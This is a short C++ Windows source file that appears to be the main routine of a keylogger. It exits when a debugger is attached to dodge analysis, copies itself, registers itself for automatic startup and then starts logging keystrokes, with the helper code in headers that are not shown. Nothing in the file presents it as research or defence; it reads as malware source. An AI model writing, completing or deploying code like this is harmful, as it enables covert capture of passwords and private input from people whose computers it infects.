#define UNICODE
#include <Windows.h>
#include "cipher.hpp"
#include "behave.hpp"

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    if (IsDebuggerPresent())
    {
        return -1;
    }

    std::string p = cpSelf();
    if (p != "")
    {
        autoStart(p);
    }
    startKeyLogging();
    return 0;
}